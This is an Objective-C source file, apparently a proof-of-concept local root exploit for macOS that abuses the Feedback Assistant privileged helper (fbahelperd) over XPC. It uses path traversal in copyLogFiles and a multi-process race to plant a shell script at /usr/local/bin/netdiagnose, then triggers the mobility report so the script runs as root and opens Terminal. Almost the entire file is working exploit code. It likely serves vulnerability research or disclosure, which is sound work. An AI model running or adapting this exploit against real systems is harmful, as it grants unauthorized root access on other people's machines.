#import <Foundation/Foundation.h>

#include <notify.h>
#include <spawn.h>
#include <sys/stat.h>

#define USR_LOCAL_BIN "/usr/local/bin"
#define NETDIAG USR_LOCAL_BIN "/netdiagnose"
#define BINARY "/System/Library/CoreServices/Applications/Feedback Assistant.app/Contents/MacOS/Feedback Assistant"
#define NOTIFY_NAME "me.chichou.fbaroot"

#define LOG(fmt, ...) NSLog(@"[LightYear] " fmt "\n", ##__VA_ARGS__)

@protocol FBAPrivilegedDaemon <NSObject>
- (void)copyLogFiles:(NSDictionary *)mapping;
- (void)runMobilityReportWithDestination:(NSURL *)dest;
@end

extern char **environ;

void child(const char *path, int stage) {
  NSDictionary *transformed = [[NSDictionary alloc] initWithContentsOfFile:[NSString stringWithUTF8String:path]];
  NSXPCConnection *connection = [[NSXPCConnection alloc] initWithMachServiceName:@"com.apple.appleseed.fbahelperd"
                                                                         options:NSXPCConnectionPrivileged];
  connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(FBAPrivilegedDaemon)];
  [connection resume];
  id remote = connection.remoteObjectProxy;
  if (stage == 1)
    [remote copyLogFiles:[NSDictionary dictionaryWithDictionary:transformed]];

  else if (stage == 2)
    [remote runMobilityReportWithDestination:[NSURL fileURLWithPath:@"/tmp/whatever.mdsdiagnostic"]];

  char target_binary[] = BINARY;
  char *target_argv[] = {target_binary, NULL};
  posix_spawnattr_t attr;
  posix_spawnattr_init(&attr);
  short flags;
  posix_spawnattr_getflags(&attr, &flags);
  flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
  posix_spawnattr_setflags(&attr, flags);
  posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

NSString *relative(NSString *component) {
  return [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:component];
}

NSDictionary *traversal(NSDictionary *mapping) {
  NSMutableDictionary *transformed = [[NSMutableDictionary alloc] init];
  for (NSString *key in mapping) {
    NSString *val = mapping[key];
    NSString *newKey = [@"/var/log/../../.." stringByAppendingPathComponent:key];
    NSString *newVal = [@"/tmp/../.." stringByAppendingPathComponent:val];
    transformed[newKey] = newVal;
  }
  return [transformed copy];
}

#define RACE_COUNT 8

#define SPAWN_CHILDREN(stage)                                                                                          \
  for (int i = 0; i < RACE_COUNT; i++)                                                                                 \
    processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ session, @ #stage ]];

#define TERMINATE_CHILDREN                                                                                             \
  for (int i = 0; i < RACE_COUNT; i++)                                                                                 \
    [processes[i] terminate];

int exploit() {
  int status = 0;
  NSError *err = NULL;
  NSFileManager *mgr = [NSFileManager defaultManager];
  NSString *guid = [[NSProcessInfo processInfo] globallyUniqueString];
  NSString *root = [NSTemporaryDirectory() stringByAppendingPathComponent:guid];
  [mgr removeItemAtPath:root error:nil];

  NSString *fakebin = [root stringByAppendingPathComponent:@"bin"];
  [mgr createDirectoryAtPath:fakebin withIntermediateDirectories:YES attributes:nil error:NULL];
  NSString *netdiagnose = [fakebin stringByAppendingPathComponent:@"netdiagnose"];

  BOOL isDir = NO;
  BOOL doesBrewExists = [mgr fileExistsAtPath:@USR_LOCAL_BIN isDirectory:&isDir];
  NSMutableDictionary *mapping = [[NSMutableDictionary alloc] init];
  if (doesBrewExists && isDir) {
    mapping[netdiagnose] = @NETDIAG;
  } else {
    mapping[fakebin] = @USR_LOCAL_BIN;
  }

#define SHELL_TEMPLATE                                                                                                 \
  @"#!/bin/sh\n"                                                                                                       \
   "%@\n"                                                                                                              \
   "/Applications/Calculator.app/Contents/MacOS/Calculator &\n"                                                        \
   "/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal\n"                                                    \
   "rm " NETDIAG "\n"

  {
    NSString *exec = [[NSBundle mainBundle] executablePath];
    NSString *sh = [NSString stringWithFormat:SHELL_TEMPLATE, exec];
    [sh writeToFile:netdiagnose atomically:NO encoding:NSUTF8StringEncoding error:&err];
    // LOG(@"%@\n%@", sh, err);
    chmod([netdiagnose UTF8String], 0777);
  }

  LOG("Now race");
  NSString *session = [root stringByAppendingPathComponent:@"task.plist"];
  [traversal(mapping) writeToFile:session atomically:NO];

  NSTask *processes[RACE_COUNT];
  NSString *exec = [[NSBundle mainBundle] executablePath];

  SPAWN_CHILDREN(1);

  int i = 0;
  const char *binary = NETDIAG;
  struct timespec ts = {
      .tv_sec = 0,
      .tv_nsec = 100 * 1000000,
  };

  while (access(binary, F_OK) == -1) {
    nanosleep(&ts, NULL);
    if (++i > 20) { // wait for 2 seconds at most
      LOG("Stage 1 timed out, retry");
      status = -1;
      goto cleanup;
    }
  }

  chmod(binary, 0777);
  LOG("Stage 1 succeed");

  dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
  int token;
  notify_register_dispatch(NOTIFY_NAME, &token, dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0),
                           ^(int token) {
                             LOG("It works!");
                             dispatch_semaphore_signal(semaphore);
                             notify_cancel(token);
                           });
  SPAWN_CHILDREN(2);

  // wait for 2s
  dispatch_time_t timeout = dispatch_time(DISPATCH_TIME_NOW, 2.0 * NSEC_PER_SEC);
  status = dispatch_semaphore_wait(semaphore, timeout);
  if (status != 0)
    LOG("Timed out");

cleanup:
  TERMINATE_CHILDREN
  return status;
}

int root() {
  notify_post(NOTIFY_NAME);
  LOG("I am groot (euid: %d)", geteuid());
  LOG("bye");
  return 0;
}

int main(int argc, char *argv[]) {
  @autoreleasepool {
    if (geteuid()) {
      if (argc == 3) {
        child(argv[1], atoi(argv[2]));
        return 0;
      }

      for (int i = 0; i < 10; i++) {
        if (exploit() == 0)
          return 0;
      }

      LOG("all tries failed");
      return 1;
    } else {
      return root();
    }
  }
}